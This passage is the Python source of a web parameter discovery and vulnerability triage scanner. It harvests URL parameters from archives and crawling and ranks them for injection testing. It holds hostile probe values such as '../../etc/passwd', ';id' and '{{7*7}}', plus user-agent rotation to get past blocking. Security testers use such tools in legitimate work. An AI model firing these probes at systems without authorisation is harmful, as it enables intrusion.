#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ParmHunter 2.3.0 — autonomous parameter discovery & triage engine

Pipeline:
  1. Harvest param names concurrently (archives, katana, waybackurls, gau,
     live crawl, JS, sitemap, OpenAPI, GraphQL) + built-in dictionary + -w.
     Every source is timeboxed so a slow archive can never stall the run.
  2. Rank by heuristics and a local SQLite hit-rate model.
  3. Baseline-first differential probing with per-base caching, token-Jaccard
     change scoring, soft-404 awareness and per-class detectors.
  4. Emit per-class parameter lists and per-class findings, banded by severity.

Author : Inayat Hussain ( Security Researcher )
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import hashlib
import html
import json
import logging
import os
import random
import re
import shutil
import socket
import sqlite3
import string
import subprocess
import sys
import time
from collections import Counter, defaultdict
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen

logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

try:
    import aiohttp
    from aiohttp import abc as aiohttp_abc
    HAVE_AIOHTTP = True
except ImportError:
    HAVE_AIOHTTP = False

VERSION = "2.3.0"
MAX_BODY = 400_000
SOFT_404_SIM = 0.92
DNS_TTL = 300

SEVERITY = {
    "rce": "critical", "sqli": "high", "lfi": "high", "ssrf": "high",
    "ssti": "high", "open-redirect": "medium", "xss": "medium",
    "crlf": "medium", "idor": "medium", "debug-flag": "low", "error": "low",
}
SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

GO_TOOLS = {
    "katana": "github.com/projectdiscovery/katana/cmd/katana@latest",
    "waybackurls": "github.com/tomnomnom/waybackurls@latest",
    "gau": "github.com/lc/gau/v2/cmd/gau@latest",
}

BUCKET_CLASSES = ["xss", "sqli", "lfi", "rce", "ssrf", "ssti",
                  "open-redirect", "crlf", "idor", "debug-flag"]


# ───────────────────────────── console ──────────────────────────────

class C:
    on = True
    G = "\033[1;32m"; Y = "\033[1;33m"; R = "\033[1;31m"
    CY = "\033[1;36m"; D = "\033[2m"; X = "\033[0m"

    @classmethod
    def _w(cls, code, tag, msg):
        (print(f"{code}{tag}{cls.X} {msg}", flush=True) if cls.on
         else print(f"{tag} {msg}", flush=True))

    @classmethod
    def ok(cls, m): cls._w(cls.G, "[+]", m)
    @classmethod
    def info(cls, m): cls._w(cls.CY, "[*]", m)
    @classmethod
    def warn(cls, m): cls._w(cls.Y, "[!]", m)
    @classmethod
    def err(cls, m): cls._w(cls.R, "[-]", m)
    @classmethod
    def hit(cls, m): cls._w(cls.R, "[>]", m)
    @classmethod
    def dim(cls, m): cls._w(cls.D, "   ", m)


def token(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ─────────────────────────────── banner ─────────────────────────────

_WORDMARK = {
    "P": [" ____  ", "|  _ \\ ", "| |_) |", "|  __/ ", "|_|    "],
    "A": ["    _    ", "   / \\   ", "  / _ \\  ", " / ___ \\ ", "/_/   \\_\\"],
    "R": [" ____  ", "|  _ \\ ", "| |_) |", "|  _ < ", "|_| \\_\\"],
    "M": [" __  __ ", "|  \\/  |", "| \\  / |", "| |\\/| |", "|_|  |_|"],
    "H": [" _   _ ", "| | | |", "| |_| |", "|  _  |", "|_| |_|"],
    "U": [" _   _ ", "| | | |", "| | | |", "| |_| |", " \\___/ "],
    "N": [" _   _ ", "| \\ | |", "|  \\| |", "| |\\  |", "|_| \\_|"],
    "T": [" _____ ", "|_   _|", "  | |  ", "  | |  ", "  |_|  "],
    "E": [" _____ ", "| ____|", "|  _|  ", "| |___ ", "|_____|"],
}
_WORD = "PARMHUNTER"


def _wordmark() -> list:
    return [" ".join(_WORDMARK[c][i] for c in _WORD) for i in range(5)]


def banner(cfg):
    G = "\033[1;32m"; CY = "\033[1;36m"; Y = "\033[1;33m"; D = "\033[2m"; X = "\033[0m"
    art = _wordmark()
    rule = "─" * max(len(r) for r in art)
    mode = "passive-only" if cfg.passive_only else "active-only" if cfg.active_only else "full"
    targets = len(cfg.urls) + (1 if cfg.domain else 0)
    tools = ",".join(t for t in GO_TOOLS if tool_path(t)) or "none"

    print()
    for row in art:
        print(f"  {G}{row}{X}")
    print(f"  {D}{rule}{X}")
    print(f"  {G}ParmHunter v{VERSION}{X} {D}· autonomous parameter discovery & triage{X}")
    print(f"  {CY}Author : Inayat Hussain ( Security Researcher ){X}")
    print(f"  {D}{rule}{X}")
    print(f"  {D}mode{X} {mode}   {D}threads{X} {cfg.threads}   {D}min-conf{X} {cfg.min_confidence}"
          f"   {D}method{X} {cfg.method}   {D}verify{X} {'on' if cfg.verify else 'off'}")
    print(f"  {D}targets{X} {targets}   {D}wordlists{X} {len(cfg.wordlists)}   "
          f"{D}learn-db{X} {'off' if cfg.no_learn else 'on'}   "
          f"{D}cache{X} {'on' if cfg.cache else 'off'}")
    print(f"  {D}resolver{X} {'aiodns' if cfg.aiodns else 'cached-threaded'}"
          f"{'  ipv4' if cfg.ipv4 else ''}   {D}external{X} {tools}")
    print(f"  {Y}authorized testing only — know your scope{X}")
    print()


# ─────────────────────────── tool bootstrap ─────────────────────────

_BIN_DIRS = []


def go_bin_dir():
    if _BIN_DIRS:
        return _BIN_DIRS[0]
    cands = []
    if os.environ.get("GOBIN"):
        cands.append(os.environ["GOBIN"])
    if os.environ.get("GOPATH"):
        cands.append(os.path.join(os.environ["GOPATH"], "bin"))
    cands.append(os.path.expanduser("~/go/bin"))
    cands.append("/usr/local/bin")
    for d in cands:
        if d and os.path.isdir(d) and d not in os.environ.get("PATH", ""):
            os.environ["PATH"] = os.environ.get("PATH", "") + os.pathsep + d
    _BIN_DIRS.extend(cands)
    return cands[0]


def tool_path(name):
    go_bin_dir()
    return shutil.which(name)


def ensure_tools(cfg):
    """Best-effort go install of missing recon binaries."""
    if not cfg.install_tools:
        return
    missing = [t for t in GO_TOOLS if not tool_path(t)]
    if not missing:
        return
    if not shutil.which("go"):
        C.warn(f"missing {', '.join(missing)} — install Go to auto-fetch")
        return
    dest = go_bin_dir()
    for name in missing:
        C.info(f"installing {name}")
        try:
            subprocess.run(
                ["go", "install", GO_TOOLS[name]],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                timeout=240, check=False,
                env={**os.environ, "GOBIN": dest},
            )
        except (subprocess.TimeoutExpired, OSError):
            pass
    got = [t for t in GO_TOOLS if tool_path(t)]
    if got:
        C.ok(f"available: {', '.join(got)}")
    still = [t for t in GO_TOOLS if not tool_path(t)]
    if still:
        C.warn(f"still missing: {', '.join(still)}")


# ────────────────────────────── parameters ──────────────────────────

def _s(x):
    return x.split()


BUILTIN = {
    "sql": _s("""id pid uid gid user_id item_id product_id order_id invoice_id account_id cat
        category categoryid cid page_id post_id news_id article_id doc_id file_id key code ref no
        num number count limit offset start sort order orderby column table db database schema view
        where filter q query search keyword s year month day"""),
    "redirect": _s("""redirect redirect_uri redirect_url return returnurl return_url returnto goto
        next dest destination continue target url uri link callback callbackurl back backurl forward
        out r u redir redirurl forward_url checkout_url success_url cancel_url fallback
        redirect_to redirectTo return_to referer referrer"""),
    "lfi": _s("""file filename filepath path page template tpl view load include inc doc document
        folder dir root pg p src source read download upload img image attachment asset resource
        module layout lang language locale theme skin cfg config ini log file_path"""),
    "ssrf": _s("""url uri host hostname server domain site ip addr address port proxy fetch load_url
        image_url imgurl src feed rss webhook endpoint api apiurl service remote target link source
        base cdn ws wss import proxy_url"""),
    "rce": _s("""cmd command exec execute run shell ping query code eval function action do op
        operation task job process system script args arg param params payload data"""),
    "xss": _s("""q s search query keyword keywords term name title msg message text comment body
        content desc description subject note label value val input str string html echo jsonp cb
        format output print preview hl highlight tag tags"""),
    "ssti": _s("""template tpl view layout render theme skin name page file format engine mode
        body content"""),
    "crlf": _s("""url redirect return next path file host callback name value"""),
    "debug": _s("""debug test dev verbose trace log logging mode env environment stage preview admin
        is_admin superuser root sandbox dry_run demo beta experimental internal show display print
        dump export pretty raw source view nocache force reload refresh draft"""),
    "object": _s("""id ids uuid guid ref ref_id record record_id object object_id entity entity_id
        key pk slug handle hash token session sid sku isbn ean serial version rev revision parent
        parent_id child owner owner_id tenant tenant_id org org_id company company_id group
        group_id team team_id project project_id workspace board folder_id node node_id element
        item line row index idx n p"""),
    "paging": _s("""page p pg offset skip start from limit size per_page pagesize count max num
        results rows take top after before cursor since until"""),
    "format": _s("""format ext type output render response encoding charset mime content_type
        accept callback jsonp wrap"""),
    "auth": _s("""token access_token auth apikey api_key key secret sig signature nonce state code
        grant scope client_id client_secret username user email password pass pwd remember otp
        mfa captcha csrf xsrf"""),
    "upload": _s("""file upload attachment image img avatar photo picture media blob binary base64
        data content stream"""),
    "graphql": _s("""query variables operationName extensions doc"""),
    "misc": _s("""ajax json xml csv yaml rss atom api_version v ver version timestamp ts cache
        status state active enabled visible public private method event kind class style color
        size width height qty quantity price currency country region city zip lat lng timezone tz
        utc date time start_date end_date from_date to_date"""),
}

CLASS_PATTERNS = [
    ("ssrf", re.compile(r"(^|_)(url|uri|host|domain|ip|addr|endpoint|webhook|proxy|feed|src)($|_)", re.I)),
    ("redirect", re.compile(r"(redirect|return|next|goto|dest|continue|callback|refer|forward|redir|back)", re.I)),
    ("lfi", re.compile(r"(file|path|dir|folder|include|template|tpl|doc|page|load|read|src|log|cfg|config)", re.I)),
    ("sql", re.compile(r"(^|_)(id|uid|pid|num|no|count|limit|offset|sort|order|cat|key|code)($|_)|(sql|query|where)", re.I)),
    ("rce", re.compile(r"(cmd|exec|command|shell|ping|run|eval|system|process|script|payload)", re.I)),
    ("ssti", re.compile(r"(template|tpl|render|layout|theme|engine|format)", re.I)),
    ("crlf", re.compile(r"(redirect|return|next|callback|host|path)", re.I)),
    ("debug", re.compile(r"(debug|test|dev|verbose|trace|log|env|admin|mode|preview|raw|source)", re.I)),
    ("auth", re.compile(r"(token|auth|key|secret|pass|pwd|session|csrf|otp|code)", re.I)),
    ("object", re.compile(r"(^|_)(id|uuid|guid|ref|slug|sku|record|object|entity|pk|node)($|_)", re.I)),
    ("xss", re.compile(r"(q|s|search|query|keyword|name|title|msg|text|comment|content|desc|note|label|value|jsonp|cb)", re.I)),
    ("paging", re.compile(r"(page|offset|limit|skip|cursor|start|size)", re.I)),
]

EXCLUDE_EXT = {".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico", ".woff",
               ".woff2", ".ttf", ".eot", ".mp4", ".mp3", ".pdf", ".zip", ".gz"}

# ───────────────────────────── models ───────────────────────────────

@dataclass
class Finding:
    url: str
    param: str
    vuln: str
    severity: str
    confidence: int
    evidence: str
    payload: str = ""
    status: int = 0
    base_url: str = ""
    ts: str = ""

    def line(self):
        return (f"{self.severity.upper():<8} {self.confidence:>3}%  "
                f"{self.url}  <- {self.param}  | {self.evidence}")


@dataclass
class Resp:
    status: int = 0
    headers: dict = field(default_factory=dict)
    body: str = ""
    elapsed: float = 0.0
    error: str = ""


@dataclass
class Config:
    urls: list = field(default_factory=list)
    listfile: str = ""
    use_stdin: bool = False
    domain: str = ""
    seeds: list = field(default_factory=list)
    wordlists: list = field(default_factory=list)
    wordlist_dir: str = ""
    only_wordlist: bool = False
    threads: int = 40
    limit_per_host: int = 8
    aiodns: bool = False
    ipv4: bool = False
    dns_ttl: int = DNS_TTL
    sleep_probe: float = 4.0
    timeout: float = 15.0
    archive_timeout: float = 25.0
    passive_timeout: float = 90.0
    retries: int = 2
    rate: float = 0.0
    max_time: float = 0.0
    proxy: str = ""
    headers: dict = field(default_factory=dict)
    cookie: str = ""
    user_agent: str = ""
    insecure: bool = False
    method: str = "GET"
    json_body: bool = False
    outdir: str = "output"
    csv_out: bool = False
    md_out: bool = False
    html_out: bool = False
    jsonl: bool = False
    silent: bool = False
    no_banner: bool = False
    crawl_depth: int = 2
    max_urls: int = 200
    max_params: int = 45
    max_size: int = MAX_BODY
    passive_only: bool = False
    active_only: bool = False
    params_only: bool = False
    external: bool = True
    install_tools: bool = True
    katana_depth: int = 3
    tool_timeout: float = 180.0
    collab: str = ""
    db: str = "parmhunter.kb.sqlite"
    min_confidence: int = 55
    min_severity: str = "low"
    probe_classes: list = field(default_factory=list)
    skip_classes: list = field(default_factory=list)
    scope_regex: str = ""
    exclude_ext: bool = True
    verify: bool = False
    resume: bool = False
    cache: bool = False
    waf_detect: bool = True
    notify: str = ""
    stats: bool = False
    no_learn: bool = False
    plan: bool = False


UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]


def base_headers(cfg: Config, url: str = "") -> dict:
    h = {
        "User-Agent": cfg.user_agent or random.choice(UA_POOL),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Connection": "keep-alive",
    }
    if url:
        p = urlsplit(url)
        h["Referer"] = f"{p.scheme}://{p.netloc}/"
    if cfg.cookie:
        h["Cookie"] = cfg.cookie
    h.update(cfg.headers)
    return h


# ────────────────────────────── resolver ────────────────────────────

if HAVE_AIOHTTP:
    class CachedResolver(aiohttp_abc.AbstractResolver):
        """Memoising resolver with a hard concurrency cap.

        Stops the gaierror storm from dozens of workers hitting the system
        resolver at once, and collapses repeat lookups into one.
        """

        def __init__(self, ttl=DNS_TTL, ipv4=False):
            self._inner = aiohttp.ThreadedResolver()
            self._cache = {}
            self._lock = asyncio.Lock()
            self._sem = asyncio.Semaphore(12)
            self._ttl = ttl
            self._family = socket.AF_INET if ipv4 else socket.AF_UNSPEC

        async def resolve(self, host, port=0, family=socket.AF_INET):
            key = (host, port)
            hit = self._cache.get(key)
            if hit and time.monotonic() - hit[0] < self._ttl:
                return hit[1]
            async with self._lock:
                hit = self._cache.get(key)
                if hit and time.monotonic() - hit[0] < self._ttl:
                    return hit[1]
                async with self._sem:
                    res = await self._inner.resolve(host, port, self._family)
                self._cache[key] = (time.monotonic(), res)
                return res

        async def close(self):
            await self._inner.close()
else:
    CachedResolver = None


# ─────────────────────────────── http ───────────────────────────────

DNS_HINTS = ("gaierror", "name resolution", "Temporary failure", "getaddrinfo", "Cannot connect")


class Fetcher:
    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.sem = asyncio.Semaphore(max(1, cfg.threads))
        self.session = None
        self.resolver = None
        self._gate = asyncio.Lock()
        self._next = 0.0
        self.cache = {}
        self.inflight = {}
        self.cache_path = Path(cfg.outdir) / "http.cache.jsonl"
        self.errors = 0
        self.ok = 0

    async def start(self):
        if self.cfg.cache and self.cache_path.exists():
            for line in self.cache_path.read_text(errors="replace").splitlines():
                try:
                    e = json.loads(line)
                    self.cache[e["k"]] = Resp(**e["v"])
                except Exception:  # noqa: BLE001
                    continue
        if HAVE_AIOHTTP:
            self.resolver = None
            if self.cfg.aiodns:
                try:
                    self.resolver = aiohttp.AsyncResolver()
                except Exception:  # noqa: BLE001
                    self.resolver = None
            if self.resolver is None:
                self.resolver = CachedResolver(ttl=self.cfg.dns_ttl, ipv4=self.cfg.ipv4)
            conn = aiohttp.TCPConnector(
                limit=self.cfg.threads,
                limit_per_host=self.cfg.limit_per_host,
                ttl_dns_cache=self.cfg.dns_ttl,
                resolver=self.resolver,
                ssl=False if self.cfg.insecure else None,
                enable_cleanup_closed=True,
            )
            self.session = aiohttp.ClientSession(
                connector=conn,
                timeout=aiohttp.ClientTimeout(total=self.cfg.timeout,
                                              connect=min(8.0, self.cfg.timeout)),
                headers=base_headers(self.cfg),
            )

    async def close(self):
        if self.session:
            await self.session.close()
        if self.resolver and not isinstance(self.resolver, aiohttp.AsyncResolver):
            try:
                await self.resolver.close()
            except Exception:  # noqa: BLE001
                pass
        if self.cfg.cache:
            self.cache_path.parent.mkdir(parents=True, exist_ok=True)
            with self.cache_path.open("w") as fh:
                for k, v in self.cache.items():
                    fh.write(json.dumps({"k": k, "v": asdict(v)}) + "\n")

    async def _throttle(self):
        if self.cfg.rate <= 0:
            return
        interval = 1.0 / self.cfg.rate
        async with self._gate:
            t = time.monotonic()
            wait = max(0.0, self._next - t)
            self._next = max(t, self._next) + interval
        if wait:
            await asyncio.sleep(wait)

    async def fetch(self, url, method="GET", data=None, extra_headers=None,
                    timeout=None) -> Resp:
        key = hashlib.sha1(f"{method}|{url}|{data or ''}".encode()).hexdigest()
        if self.cfg.cache and key in self.cache:
            return self.cache[key]
        if key in self.inflight:
            return await self.inflight[key]

        fut = asyncio.ensure_future(self._fetch(key, url, method, data,
                                                extra_headers, timeout))
        self.inflight[key] = fut
        try:
            return await fut
        finally:
            self.inflight.pop(key, None)

    async def _fetch(self, key, url, method, data, extra_headers, timeout):
        async with self.sem:
            await self._throttle()
            await asyncio.sleep(random.uniform(0, 0.03))
            resp = Resp(error="unreachable")
            tries = self.cfg.retries + 1
            for attempt in range(tries):
                t0 = time.monotonic()
                try:
                    if HAVE_AIOHTTP:
                        resp = await self._aio(url, method, data, extra_headers, t0, timeout)
                    else:
                        resp = await asyncio.to_thread(self._sync, url, method, data,
                                                       extra_headers, t0)
                    if resp.status in (429, 502, 503, 504) and attempt < tries - 1:
                        await asyncio.sleep(0.8 * (attempt + 1) + random.uniform(0, 0.5))
                        continue
                    break
                except Exception as e:  # noqa: BLE001
                    msg = f"{type(e).__name__}: {e}"
                    resp = Resp(error=msg, elapsed=time.monotonic() - t0)
                    if attempt >= tries - 1:
                        break
                    delay = 1.2 * (attempt + 1)
                    if any(h in msg for h in DNS_HINTS):
                        delay += 1.5
                    await asyncio.sleep(delay + random.uniform(0, 0.4))
        if resp.error:
            self.errors += 1
        else:
            self.ok += 1
        if self.cfg.cache and not resp.error:
            self.cache[key] = resp
        return resp

    async def _aio(self, url, method, data, hdrs, t0, timeout):
        h = dict(hdrs or {})
        if data and "Content-Type" not in h:
            h["Content-Type"] = "application/x-www-form-urlencoded"
        total = timeout or self.cfg.timeout
        tm = aiohttp.ClientTimeout(total=total, connect=min(8.0, total))
        async with self.session.request(method, url, data=data, headers=h,
                                        allow_redirects=False, timeout=tm,
                                        proxy=self.cfg.proxy or None) as r:
            raw = await r.content.read(self.cfg.max_size)
            try:
                body = raw.decode(r.charset or "utf-8", "replace")
            except LookupError:
                body = raw.decode("latin-1", "replace")
            return Resp(r.status, {k.lower(): v for k, v in r.headers.items()},
                        body, time.monotonic() - t0)

    def _sync(self, url, method, data, hdrs, t0):
        req = Request(url, data=data.encode() if isinstance(data, str) else data,
                      method=method, headers={**base_headers(self.cfg, url), **(hdrs or {})})
        ctx = None
        if self.cfg.insecure:
            import ssl
            ctx = ssl._create_unverified_context()  # noqa: SLF001
        try:
            with urlopen(req, timeout=self.cfg.timeout, context=ctx) as r:  # noqa: S310
                body = r.read(self.cfg.max_size).decode("utf-8", "replace")
                return Resp(r.status, {k.lower(): v for k, v in r.headers.items()},
                            body, time.monotonic() - t0)
        except Exception as e:  # noqa: BLE001
            import urllib.error
            if isinstance(e, urllib.error.HTTPError):
                body = e.read(self.cfg.max_size).decode("utf-8", "replace")
                return Resp(e.code, {k.lower(): v for k, v in (e.headers or {}).items()},
                            body, time.monotonic() - t0)
            raise


# ────────────────────────── knowledge base ──────────────────────────

class Knowledge:
    def __init__(self, path, enabled=True):
        self.db = None
        if not enabled:
            return
        try:
            self.db = sqlite3.connect(path)
            self.db.execute("CREATE TABLE IF NOT EXISTS stats(param TEXT PRIMARY KEY, "
                            "tests INT DEFAULT 0, hits INT DEFAULT 0, last TEXT)")
            self.db.execute("CREATE TABLE IF NOT EXISTS findings("
                            "url TEXT, param TEXT, vuln TEXT, conf INT, ts TEXT)")
            self.db.commit()
        except sqlite3.Error:
            self.db = None

    def prior(self, param):
        if not self.db:
            return 0.0
        row = self.db.execute("SELECT tests, hits FROM stats WHERE param=?", (param,)).fetchone()
        if not row or row[0] < 3:
            return 0.0
        return min(1.0, row[1] / row[0])

    def record_test(self, param, hit):
        if not self.db:
            return
        self.db.execute("INSERT INTO stats(param,tests,hits,last) VALUES(?,1,?,?) "
                        "ON CONFLICT(param) DO UPDATE SET tests=tests+1, hits=hits+?, last=?",
                        (param, int(hit), now(), int(hit), now()))
        self.db.commit()

    def record_finding(self, f):
        if not self.db:
            return
        self.db.execute("INSERT INTO findings VALUES(?,?,?,?,?)",
                        (f.url, f.param, f.vuln, f.confidence, f.ts))
        self.db.commit()

    def close(self):
        if self.db:
            self.db.close()


# ──────────────────────────── url utils ─────────────────────────────

def build_request(base, param, value, cfg):
    if cfg.method == "GET":
        p = urlsplit(base)
        q = [(k, v) for k, v in parse_qsl(p.query, keep_blank_values=True) if k != param]
        q.append((param, value))
        return urlunsplit((p.scheme, p.netloc, p.path, urlencode(q, safe="[]"), "")), None
    p = urlsplit(base)
    q = [(k, v) for k, v in parse_qsl(p.query, keep_blank_values=True) if k != param]
    clean = urlunsplit((p.scheme, p.netloc, p.path, "", ""))
    if cfg.json_body:
        return clean, json.dumps({k: v for k, v in q})
    q.append((param, value))
    return clean, urlencode(q, safe="[]")


def norm_base(url):
    p = urlsplit(url)
    return urlunsplit((p.scheme, p.netloc, p.path or "/", p.query, ""))


def host_of(url):
    try:
        return urlsplit(url).netloc.split(":")[0]
    except Exception:  # noqa: BLE001
        return ""


def apex(host):
    return host[4:] if host.startswith("www.") else host


def _tokens(body):
    return set(re.findall(r"[A-Za-z0-9_\-]{3,}", body.lower()))


def change(a: str, b: str) -> float:
    A, B = _tokens(a), _tokens(b)
    if not A and not B:
        return 0.0
    return 1.0 - len(A & B) / max(len(A | B), 1)


def similarity(a: str, b: str) -> float:
    return 1.0 - change(a, b)


def classify(param):
    return [n for n, rx in CLASS_PATTERNS if rx.search(param)]


def score_param(param, kb):
    s = 10 + 9 * len(classify(param)) + int(kb.prior(param) * 30)
    if "[" in param:
        s += 4
    if len(param) <= 12:
        s += 2
    if re.search(r"\d", param):
        s += 1
    if len(param) > 34:
        s -= 3
    return s


def urljoin_safe(base, rel):
    from urllib.parse import urljoin
    try:
        return urljoin(base, rel)
    except Exception:  # noqa: BLE001
        return ""


def param_of(url):
    return {k for k, _ in parse_qsl(urlsplit(url).query, keep_blank_values=True) if k}


def sample_value(param):
    cls = set(classify(param))
    if cls & {"ssrf", "redirect"}:
        return "https://example.com"
    if "lfi" in cls:
        return "../../etc/passwd"
    if "rce" in cls:
        return ";id"
    if "ssti" in cls:
        return "{{7*7}}"
    if "sql" in cls:
        return "1'"
    return "FUZZ"


def bucket_of(param):
    cls = set(classify(param))
    for b in BUCKET_CLASSES:
        key = "redirect" if b == "open-redirect" else b
        if key in cls:
            return b
    return "other"


# ───────────────────────── passive harvest ──────────────────────────

ARCHIVE_UA = "Mozilla/5.0 (compatible; ParmHunter/2.3; +https://github.com/)"
CDX = "https://web.archive.org/cdx/search/cdx"


class Passive:
    """Archive/API harvesting. Every source is timeboxed and independent."""

    def __init__(self, f, cfg):
        self.f = f
        self.cfg = cfg

    async def _cdx(self, host, page, limit=600):
        # filter=original:.*=.* pushes parameter filtering server-side, which is
        # far cheaper than the statuscode filter on large domains.
        url = (f"{CDX}?url={host}/*&output=json&fl=original&collapse=urlkey"
               f"&limit={limit}&page={page}&filter=original:.*=.*")
        return await self.f.fetch(url, extra_headers={"User-Agent": ARCHIVE_UA},
                                  timeout=self.cfg.archive_timeout)

    async def wayback(self, host):
        out = set()
        for h in dict.fromkeys([apex(host), host]):
            for page in range(2):
                r = await self._cdx(h, page)
                if r.error or r.status != 200:
                    break
                try:
                    rows = json.loads(r.body)
                except Exception:  # noqa: BLE001
                    break
                if not rows:
                    break
                for row in rows:
                    u = row[0] if isinstance(row, list) and row else ""
                    if "=" in u:
                        out.add(u)
                if len(rows) < 600:
                    break
        return out

    async def commoncrawl(self, host):
        out = set()
        idx = await self.f.fetch("https://index.commoncrawl.org/collinfo.json",
                                 extra_headers={"User-Agent": ARCHIVE_UA},
                                 timeout=self.cfg.archive_timeout)
        if idx.error or idx.status != 200:
            return out
        try:
            apis = [c["cdx-api"] for c in json.loads(idx.body)[:2] if c.get("cdx-api")]
        except Exception:  # noqa: BLE001
            return out
        for api in apis:
            r = await self.f.fetch(f"{api}?url={apex(host)}/*&output=json&limit=1500",
                                   extra_headers={"User-Agent": ARCHIVE_UA},
                                   timeout=self.cfg.archive_timeout)
            if r.error or r.status != 200:
                continue
            for line in r.body.splitlines():
                try:
                    u = json.loads(line).get("url", "")
                except Exception:  # noqa: BLE001
                    continue
                if "=" in u:
                    out.add(u)
        return out

    async def urlscan(self, host):
        out = set()
        r = await self.f.fetch(f"https://urlscan.io/api/v1/search/?q=domain:{apex(host)}&size=200",
                               timeout=self.cfg.archive_timeout)
        if r.error or r.status != 200:
            return out
        try:
            data = json.loads(r.body)
        except Exception:  # noqa: BLE001
            return out
        for res in data.get("results", []):
            u = res.get("page", {}).get("url", "")
            if "=" in u:
                out.add(u)
        return out

    async def otx(self, host):
        out = set()
        for page in (1, 2):
            r = await self.f.fetch(
                f"https://otx.alienvault.com/api/v1/indicators/hostname/"
                f"{apex(host)}/url_list?limit=500&page={page}",
                timeout=self.cfg.archive_timeout)
            if r.error or r.status != 200:
                break
            try:
                data = json.loads(r.body)
            except Exception:  # noqa: BLE001
                break
            batch = data.get("url_list", [])
            if not batch:
                break
            out |= {e.get("url", "") for e in batch if "=" in e.get("url", "")}
        return out


# ─────────────────────────── external tools ─────────────────────────

async def run_tool(cmd, timeout):
    if not tool_path(cmd[0]):
        return set()
    proc = None
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return {l.strip() for l in out.decode("utf-8", "replace").splitlines() if l.strip()}
    except (asyncio.TimeoutError, OSError):
        if proc:
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass
        return set()


class External:
    def __init__(self, cfg):
        self.cfg = cfg

    async def katana(self, seed):
        return await run_tool([
            "katana", "-u", seed, "-d", str(self.cfg.katana_depth),
            "-jc", "-kf", "all", "-silent", "-duc", "-fs", "rdn",
            "-c", str(min(self.cfg.threads, 20)),
        ], self.cfg.tool_timeout)

    async def waybackurls(self, host):
        return await run_tool(["waybackurls", host], self.cfg.tool_timeout)

    async def gau(self, host):
        return await run_tool(["gau", "--subs", "--threads", "5", host], self.cfg.tool_timeout)


# ──────────────────────────── crawling ──────────────────────────────

PARAM_Q = re.compile(r"[?&]([A-Za-z0-9_\-\[\]\.]{1,40})=")
PARAM_NAME = re.compile(r"""\b(?:name|id|param|parameter|field|key)\s*=\s*["']([A-Za-z0-9_\-\[\]]{1,40})["']""")
PARAM_JS = re.compile(r"""[?&]([A-Za-z0-9_\-\[\]]{1,40})=|["']([A-Za-z0-9_\-\[\]]{2,40})["']\s*:\s*["'{\[]""")
HREF = re.compile(r"""href\s*=\s*["']([^"'#]+)["']""")
SRC = re.compile(r"""<script[^>]+src\s*=\s*["']([^"']+)["']""")
JS_SKIP = set(_s("""function return var let const if else for while new this true false null
    undefined typeof window document length push slice split join replace then catch default case
    break class extends super async await yield import export from delete void in of do switch throw
    try constructor prototype string number boolean object array json map filter reduce each data
    value type name id url key"""))


class Crawler:
    def __init__(self, f, cfg):
        self.f = f
        self.cfg = cfg

    def _harvest(self, body):
        found = set(PARAM_Q.findall(body)) | set(PARAM_NAME.findall(body))
        for a, b in PARAM_JS.findall(body):
            c = a or b
            if c and c.lower() not in JS_SKIP and len(c) > 1:
                found.add(c)
        return {p for p in found if p and p.lower() not in JS_SKIP}

    def _in_scope(self, url, host):
        if self.cfg.scope_regex:
            return re.search(self.cfg.scope_regex, url) is not None
        return host_of(url).endswith(apex(host))

    async def _get(self, url):
        r = await self.f.fetch(url)
        if r.status in (403, 429) or r.error:
            r = await self.f.fetch(url, extra_headers={
                "User-Agent": random.choice(UA_POOL),
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Sec-Fetch-Site": "same-origin",
            })
        return r

    async def crawl(self, seed):
        host = host_of(seed)
        params, links, scripts = set(), set(), set()
        seen, queue = set(), [(seed, 0)]

        while queue and len(seen) < self.cfg.max_urls:
            url, depth = queue.pop(0)
            if url in seen:
                continue
            seen.add(url)
            if self.cfg.exclude_ext and Path(urlsplit(url).path).suffix.lower() in EXCLUDE_EXT:
                continue
            r = await self._get(url)
            if r.error or r.status >= 400:
                continue
            ctype = r.headers.get("content-type", "")
            if "html" in ctype or not ctype:
                params |= self._harvest(r.body)
                for href in HREF.findall(r.body):
                    if href.startswith(("mailto:", "javascript:", "tel:", "#")):
                        continue
                    absolute = urljoin_safe(url, href)
                    if absolute and self._in_scope(absolute, host):
                        links.add(absolute)
                        if depth < self.cfg.crawl_depth:
                            queue.append((absolute, depth + 1))
                scripts |= {urljoin_safe(url, s) for s in SRC.findall(r.body)}
            elif "javascript" in ctype:
                params |= self._harvest(r.body)

        for s in list(scripts)[:40]:
            if not s:
                continue
            r = await self._get(s)
            if not r.error and r.status == 200:
                params |= self._harvest(r.body)

